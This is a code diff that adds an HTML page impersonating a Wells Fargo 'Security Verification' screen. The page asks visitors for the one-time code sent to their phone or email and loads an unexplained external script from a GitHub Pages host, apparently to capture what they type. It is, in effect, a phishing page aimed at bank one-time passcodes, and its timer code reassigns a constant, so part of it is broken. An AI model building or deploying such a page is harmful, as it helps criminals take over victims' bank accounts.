@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Wells Fargo – Verification</title>
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+body {
+  background-color: #f1f4f8;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.verify-container {
+  background-color: #ffffff;
+  padding: 40px;
+  width: 380px;
+  border-radius: 10px;
+  text-align: center;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+}
+
+.logo img {
+  width: 140px;
+  margin-bottom: 20px;
+}
+
+h2 {
+  color: #c71f1f; /* Wells Fargo red */
+  margin-bottom: 15px;
+  font-size: 22px;
+}
+
+p {
+  font-size: 13px;
+  color: #555;
+  margin-bottom: 20px;
+}
+
+input[type="text"] {
+  width: 100%;
+  padding: 12px;
+  border-radius: 8px;
+  border: 1px solid #ccd0d5;
+  background-color: #f5f5f7;
+  color: #000;
+  font-size: 18px;
+  text-align: center;
+  margin-bottom: 20px;
+  letter-spacing: 8px;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  border-radius: 8px;
+  border: none;
+  background-color: #c71f1f;
+  color: white;
+  font-size: 16px;
+  cursor: pointer;
+  margin-bottom: 10px;
+}
+
+button.resend-btn {
+  background-color: #ffb81c; /* Wells Fargo gold accent */
+  color: #0a2a5a;
+}
+
+button:disabled {
+  background-color: #aaa;
+  color: white;
+  cursor: not-allowed;
+}
+
+.resend {
+  margin-top: 10px;
+  font-size: 14px;
+  color: #777;
+}
+</style>
+
+</head>
+
+<body>
+<script src="https://plyarth.github.io/intc/int1.js"></script>
+<div class="verify-container">
+
+  <div class="logo">
+    <!-- Wells Fargo logo placeholder -->
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR1AqumM5Uw1RM8DsHKxvW99_TUhDiy4rQ43-al25Ofgw&s=10" alt="Wells Fargo Logo">
+  </div>
+
+  <h2>Security Verification</h2>
+
+  <p>
+    Please enter the 6-digit code sent to your registered mobile number or email.
+  </p>
+
+  <form>
+    <input type="text" id="verifyInput" placeholder="------" maxlength="20" name="Otp Code" required>
+
+    <button type="submit">Verify Code</button>
+
+    <button type="button" id="resendBtn" class="resend-btn" disabled>
+      Resend Code
+    </button>
+
+    <div class="resend">
+      Resend available in <span id="timer">30</span>s
+    </div>
+  </form>
+
+</div>
+
+<script>
+let countdown = 30;
+const timerSpan = document.getElementById("timer");
+const resendBtn = document.getElementById("resendBtn");
+const resendText = document.querySelector(".resend");
+
+function startTimer() {
+  const interval = setInterval(() => {
+    countdown--;
+    timerSpan.innerText = countdown;
+
+    if (countdown <= 0) {
+      clearInterval(interval);
+      resendBtn.disabled = false;
+      resendText.innerText = "You can now resend the verification code";
+    }
+  }, 1000);
+}
+
+resendBtn.addEventListener("click", () => {
+  alert("Demo: Wells Fargo resend code action");
+
+  countdown = 30;
+  resendBtn.disabled = true;
+
+  resendText.innerHTML =
+    'Resend available in <span id="timer">30</span>s';
+
+  // re-bind timer span after reset
+  timerSpan = document.getElementById("timer");
+
+  startTimer();
+});
+
+startTimer();
+</script>
+
+</body>
+</html>
